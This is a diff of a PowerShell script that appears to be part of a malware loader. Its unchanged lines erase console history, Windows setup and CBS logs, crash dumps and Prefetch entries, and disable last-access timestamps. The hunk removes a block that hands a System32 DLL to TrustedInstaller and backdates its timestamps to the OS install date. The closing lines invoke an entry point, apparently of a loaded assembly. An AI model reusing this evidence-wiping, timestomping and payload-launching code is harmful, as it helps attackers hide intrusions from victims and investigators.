@@ -12,22 +12,6 @@ Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOn
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 fsutil behavior set disablelastaccess 1
-$path = "C:\Windows\System32\BluetoothDesktopHandlers.dll"
-if (Test-Path $path) {
-    $r1 = icacls $path /reset
-    $r2 = icacls $path /setowner "NT SERVICE\TrustedInstaller"
-}
-
-try {
-    $installDate = (Get-CimInstance Win32_OperatingSystem).InstallDate
-    $item = Get-Item $path
-
-    $item.CreationTime = $installDate
-    $item.LastWriteTime = $installDate
-}
-
-
-
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
@@ -102,6 +86,7 @@ Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyCon
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 15
+
 if ($entry -and $entry.GetParameters().Count -eq 1) {
     $entry.Invoke($null, @([string[]]@()))
 } elseif ($entry) {
